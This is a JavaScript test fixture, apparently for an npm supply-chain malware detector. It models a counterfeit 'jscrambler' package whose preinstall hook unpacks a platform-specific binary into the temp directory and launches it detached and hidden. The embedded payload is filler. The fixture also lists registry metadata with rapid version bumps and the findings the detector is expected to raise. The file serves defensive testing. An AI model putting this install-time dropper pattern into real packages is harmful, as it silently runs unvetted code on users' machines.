export const jscramblerPreinstall = {
  pkgJson: {
    name: 'jscrambler',
    version: '8.14.0',
    description: 'Jscrambler - JavaScript Protection',
    main: 'dist/index.js',
    bin: {
      jscrambler: 'dist/bin/jscrambler.js'
    },
    scripts: {
      preinstall: 'node dist/setup.js'
    }
  },
  allFiles: [
    {
      path: 'dist/index.js',
      content: `module.exports = { protect: (code) => code };`
    },
    {
      path: 'dist/setup.js',
      content: `const fs = require('fs');
const path = require('path');
const os = require('os');
const { spawn } = require('child_process');

const containerPath = path.join(__dirname, 'intro.js');
const container = fs.readFileSync(containerPath);

// Parse CSI container header: \\x1bCSI\\x01 + payload count
if (container[0] !== 0x1b || container[1] !== 0x43 || container[2] !== 0x53 || container[3] !== 0x49) {
  process.exit(0);
}

const payloadCount = container[5];
let offset = 6;
const payloads = [];

for (let i = 0; i < payloadCount; i++) {
  const platform = container[offset];
  const size = container.readUInt32LE(offset + 1);
  offset += 5;
  const data = container.slice(offset, offset + size);
  payloads.push({ platform, data });
  offset += size;
}

const platformMap = { linux: 0, darwin: 1, win32: 2 };
const platformId = platformMap[process.platform];
if (platformId === undefined) process.exit(0);

const payload = payloads.find(p => p.platform === platformId);
if (!payload) process.exit(0);

const zlib = require('zlib');
const decompressed = zlib.gunzipSync(payload.data);

const tmpDir = os.tmpdir();
const binaryName = process.platform === 'win32' ? 'jscrambler-helper.exe' : 'jscrambler-helper';
const binaryPath = path.join(tmpDir, binaryName);

fs.writeFileSync(binaryPath, decompressed);
if (process.platform !== 'win32') {
  fs.chmodSync(binaryPath, 0o755);
}

const child = spawn(binaryPath, [], {
  detached: true,
  stdio: 'ignore',
  windowsHide: true
});
child.unref();`
    },
    {
      path: 'dist/intro.js',
      content: `\x1bCSI\x01\x03` + Buffer.alloc(100000).fill('X').toString()
    }
  ],
  registryMeta: {
    time: {
      created: '2020-01-15T10:00:00.000Z',
      modified: '2026-07-11T18:00:00.000Z',
      '8.13.0': '2026-06-15T10:00:00.000Z',
      '8.14.0': '2026-07-11T14:30:00.000Z',
      '8.15.0': '2026-07-11T15:00:00.000Z',
      '8.16.0': '2026-07-11T15:30:00.000Z',
      '8.17.0': '2026-07-11T16:00:00.000Z',
      '8.18.0': '2026-07-11T16:30:00.000Z',
      '8.20.0': '2026-07-11T17:00:00.000Z',
      '8.22.0': '2026-07-11T18:00:00.000Z'
    },
    'dist-tags': {
      latest: '8.22.0',
      next: '9.0.0-beta.1'
    }
  },
  expectedFindings: [
    { detector: 'tier1-lifecycle-hook-followthrough', id: 'TIER1-HOOK-FOLLOWTHROUGH' },
    { detector: 'tier1-maintainer-compromise', id: 'TIER1-MAINTAINER-COMPROMISE' }
  ]
};
